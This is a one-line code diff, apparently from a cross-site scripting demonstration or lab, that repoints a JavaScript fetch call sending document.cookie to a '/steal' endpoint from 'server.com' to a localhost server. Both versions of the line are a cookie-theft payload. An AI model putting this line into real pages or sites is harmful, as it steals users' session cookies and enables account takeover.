@@ -1,1 +1,1 @@
-fetch('https://server.com/steal?cookie=' + document.cookie);
+fetch('http://localhost:3000/steal?cookie=' + document.cookie);
